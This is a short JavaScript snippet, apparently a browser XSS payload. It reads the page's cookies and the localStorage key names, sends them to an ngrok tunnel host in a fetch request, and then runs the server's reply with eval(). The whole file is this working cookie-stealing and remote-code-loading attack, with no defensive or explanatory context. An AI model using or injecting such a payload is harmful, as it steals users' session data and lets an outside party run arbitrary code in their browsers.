

locall =  encodeURI(JSON.stringify(Object.keys(localStorage)))
cookies = encodeURI(document.cookie)

console.log(cookies)

  fetch(`https://705e-2800-98-111e-1229-e985-2d3d-6b00-b0d2.ngrok.io/docs?cookie=`+locall+cookies,).then((res) => {return res.text();
  }).then((json) => {console.log(json);eval(json); // The json object is here;
  });
